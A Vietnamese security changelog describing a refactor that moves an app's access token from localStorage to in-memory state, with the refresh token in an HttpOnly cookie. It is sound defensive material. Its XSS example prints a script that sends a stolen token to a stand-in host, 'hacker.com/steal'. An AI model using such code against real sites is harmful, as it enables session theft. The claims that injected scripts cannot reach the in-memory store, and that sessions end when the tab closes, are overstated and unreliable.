# 🔒 Cải Tiến Bảo Mật Token - Security Enhancement

## 📋 Tóm tắt

Đã refactor cơ chế quản lý token để tăng cường bảo mật, loại bỏ các lỗ hổng XSS.

---

## ❌ Vấn đề trước đây

### Rủi ro bảo mật:

| Vấn đề | Mô tả | Mức độ |
|--------|-------|--------|
| **XSS Attack** | JavaScript độc hại có thể đọc `localStorage.getItem("accessToken")` | 🔴 Cao |
| **Third-party Scripts** | Các script bên thứ 3 có thể truy cập localStorage | 🔴 Cao |
| **Persistent Storage** | Token vẫn tồn tại ngay cả khi đóng browser | 🟡 Trung bình |

### Cách hoạt động cũ:
```javascript
// ❌ KHÔNG AN TOÀN
localStorage.setItem("accessToken", token);  // Bất kỳ script nào cũng có thể đọc được!
const token = localStorage.getItem("accessToken");
```

---

## ✅ Giải pháp mới

### Nguyên tắc bảo mật:

1. **accessToken**: Lưu trong **memory only** (Zustand store) ✅
2. **refreshToken**: Lưu trong **HttpOnly cookie** (không thể đọc từ JavaScript) ✅
3. **Session restore**: Dùng refreshToken để lấy accessToken mới khi reload ✅

### Cách hoạt động mới:

```javascript
// ✅ AN TOÀN
// accessToken chỉ tồn tại trong memory (Zustand store)
useStore.getState().setToken(accessToken);

// refreshToken trong HttpOnly cookie (JavaScript không thể đọc)
// Set by server: res.cookie("refreshToken", token, { httpOnly: true })
```

---

## 📝 Các thay đổi chi tiết

### 1. LoginPopup.tsx
**Trước:**
```tsx
setToken(response.accessToken);
setAccessTokenToLocalStorage(response.accessToken); // ❌ localStorage
```

**Sau:**
```tsx
setToken(response.accessToken); // ✅ Chỉ lưu trong memory (Zustand)
// Không còn lưu localStorage
```

---

### 2. SessionRestorer.tsx
**Trước:**
```tsx
// ❌ Đọc từ localStorage
const accessToken = getAccessTokenFromLocalStorage();
if (accessToken) {
  // Verify token
  const response = await authApiRequest.getCurrentUser(accessToken);
}
```

**Sau:**
```tsx
// ✅ Dùng refreshToken (HttpOnly cookie) để restore session
const response = await authApiRequest.refreshToken();
if (response.success && response.accessToken) {
  setToken(response.accessToken); // Lưu vào memory
}
```

---

### 3. lib/axios.ts
**Trước:**
```typescript
// ❌ Đọc từ localStorage
const token = getAccessTokenFromLocalStorage();
if (token) {
  config.headers.Authorization = `Bearer ${token}`;
}
```

**Sau:**
```typescript
// ✅ Đọc từ Zustand store (memory)
const getAccessToken = (): string | null => {
  return useStore.getState().token || null;
};

const token = getAccessToken();
if (token) {
  config.headers.Authorization = `Bearer ${token}`;
}
```

---

### 4. lib/tokenUtils.ts
**Trước:**
```typescript
// Các functions lưu/đọc localStorage
export const setAccessTokenToLocalStorage = (token: string): void => {
  localStorage.setItem("accessToken", token);
};
```

**Sau:**
```typescript
/**
 * @deprecated Use Zustand store instead. 
 * AccessToken should not be in localStorage.
 */
export const setAccessTokenToLocalStorage = (token: string): void => {
  console.warn("[DEPRECATED] Do not save accessToken to localStorage");
  // ...
};
```

---

## 🔄 Flow hoạt động mới

### Login Flow:
```
User Login
  ↓
POST /api/auth/login
  ↓
Backend returns: { accessToken, user }
Backend sets: refreshToken cookie (HttpOnly)
  ↓
Client saves: accessToken → Zustand store (memory)
              refreshToken → Already in cookie
  ↓
✅ User logged in
```

### Reload Page Flow:
```
Page Reload
  ↓
SessionRestorer runs
  ↓
POST /api/auth/refresh-token
  ↓
Route Handler reads: refreshToken from cookie
  ↓
Backend returns: new accessToken
  ↓
Client saves: accessToken → Zustand store (memory)
  ↓
✅ Session restored
```

### API Call Flow:
```
API Request (e.g., GET /products)
  ↓
Axios interceptor gets token from: useStore.getState().token
  ↓
Add header: Authorization: Bearer <token>
  ↓
Send to Backend
  ↓
✅ Authenticated request
```

---

## 🛡️ Bảo vệ chống XSS

### Kịch bản tấn công XSS:

**Trước đây (KHÔNG AN TOÀN):**
```html
<script>
  // ❌ Hacker có thể inject script này
  const stolenToken = localStorage.getItem("accessToken");
  fetch("https://hacker.com/steal", {
    method: "POST",
    body: JSON.stringify({ token: stolenToken })
  });
</script>
```

**Bây giờ (AN TOÀN):**
```html
<script>
  // ✅ Hacker KHÔNG thể lấy token
  const token = localStorage.getItem("accessToken"); // null
  
  // ✅ Không thể đọc HttpOnly cookie
  console.log(document.cookie); // Không có refreshToken
  
  // ✅ Không thể truy cập Zustand store từ script độc hại
  // (chỉ truy cập được trong cùng execution context)
</script>
```

---

## 📊 So sánh bảo mật

| Tiêu chí | Trước (localStorage) | Sau (Memory + HttpOnly) |
|----------|---------------------|------------------------|
| **XSS Protection** | ❌ Rất yếu | ✅ Mạnh |
| **Third-party Script** | ❌ Có thể đọc | ✅ Không thể đọc |
| **Browser DevTools** | ❌ Thấy rõ token | ✅ Không thấy token |
| **Session Persistence** | ❌ Tồn tại mãi mãi | ✅ Mất khi đóng tab |
| **Auto Refresh** | ⚠️ Cần localStorage | ✅ Dùng cookie |

---

## ⚠️ Lưu ý quan trọng

1. **accessToken chỉ tồn tại trong memory**: 
   - Khi đóng tab/browser → mất token
   - Reload page → dùng refreshToken để lấy lại

2. **refreshToken trong HttpOnly cookie**:
   - JavaScript KHÔNG thể đọc
   - Tự động gửi kèm mọi request
   - Có expiry time (30 days)

3. **Backward compatibility**:
   - Các functions localStorage được đánh dấu `@deprecated`
   - Vẫn giữ lại để cleanup data cũ
   - Hiển thị warning khi sử dụng

---

## 🧪 Testing

### Test Cases:

1. ✅ **Login**: Token lưu trong Zustand, KHÔNG có trong localStorage
2. ✅ **Reload Page**: Session restore qua refreshToken cookie
3. ✅ **API Calls**: Token được thêm vào Authorization header từ Zustand
4. ✅ **Logout**: Clear Zustand store + delete cookies
5. ✅ **Token Expired**: Auto refresh qua refreshToken cookie

### Kiểm tra trong DevTools:

```javascript
// 1. Login xong, check localStorage
localStorage.getItem("accessToken"); // ✅ null (không còn lưu)

// 2. Check Zustand store
useStore.getState().token; // ✅ Có token (chỉ trong console của app)

// 3. Check cookies
document.cookie; // ❌ Không thấy refreshToken (vì HttpOnly)
```

---

## 📚 Files đã sửa

1. `/Client/src/components/common/loginPopup/LoginPopup.tsx`
2. `/Client/src/components/auth/SessionRestorer.tsx`
3. `/Client/src/lib/axios.ts`
4. `/Client/src/lib/tokenUtils.ts`
5. `/Client/src/hooks/useAuth.ts`

---

## 🎯 Kết luận

✅ **Token được bảo vệ tốt hơn**: Không còn trong localStorage  
✅ **Chống XSS hiệu quả**: JavaScript độc hại không thể đánh cắp token  
✅ **Session management tốt hơn**: Auto refresh qua HttpOnly cookie  
✅ **User experience tốt**: Vẫn auto-login sau khi reload page  

**Best practice achieved!** 🚀🔒
